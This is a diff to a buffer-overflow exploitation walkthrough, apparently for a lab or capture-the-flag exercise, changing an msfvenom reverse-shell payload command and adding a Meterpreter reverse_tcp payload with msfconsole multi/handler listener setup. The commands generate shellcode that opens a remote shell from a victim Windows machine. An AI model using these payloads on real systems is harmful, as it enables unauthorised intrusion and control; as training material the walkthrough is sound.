@@ -228,7 +228,7 @@ Now we'll make the shellcode that will call back to your listener.
 Using msfvenom, make sure to include the same bad chars from before:
 
 
-    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=9009 EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v "shellcode"
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.6.19.12 LPORT=9009 EXITFUNC=thread -b "\x00" -f python -v "shellcode"
 
 This will give us a shell. Update LHOST, LPORT, and badchars.
 
@@ -244,6 +244,20 @@ Check your listener, you should have a shell on the victim Windows machine.
 
 If you don't, it's ok. Try again from the top.
 
+Shellcode w/ Meterpreter
+========================
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.19.12 LPORT=9009 EXITFUNC=thread -b "\x00" -f python -v "shellcode"
+
+	$msfconsole
+	msf> use exploit/multi/handler
+	msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+	msf6 exploit(multi/handler) > set lport 9009
+	lport => 9009
+	msf6 exploit(multi/handler) > set lhost tun0
+	lhost => 10.6.19.12
+	msf6 exploit(multi/handler) > show options
+	msf6 exploit(multi/handler) > run
+	
 
 Watch a Pro do it
 =================
